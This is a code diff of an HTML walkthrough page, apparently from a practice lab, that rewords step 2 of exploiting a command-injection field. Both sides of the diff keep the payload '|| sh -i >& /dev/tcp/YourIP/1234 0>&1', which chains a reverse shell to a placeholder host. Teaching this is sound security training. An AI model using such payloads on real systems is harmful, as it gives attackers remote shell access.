@@ -58,9 +58,9 @@
                         </li>
                         <li>Step 2:
                             <ul>
-                                Enter your reverse shell command in the input field with command injection vulnerability and click on <code>Convert</code> button.<br>
-                                <code>|| sh -i >& /dev/tcp/YourIP/1234 0>&1</code>
-                                You got a reverse shell.
+                                Enter your reverse shell command in the input field with command injection vulnerability and click on <code>Convert</code>.<br>
+                                <code>|| sh -i >& /dev/tcp/YourIP/1234 0>&1</code><br>
+                                You will get a reverse shell.
                             </ul>
                         </li>
                     </ul>
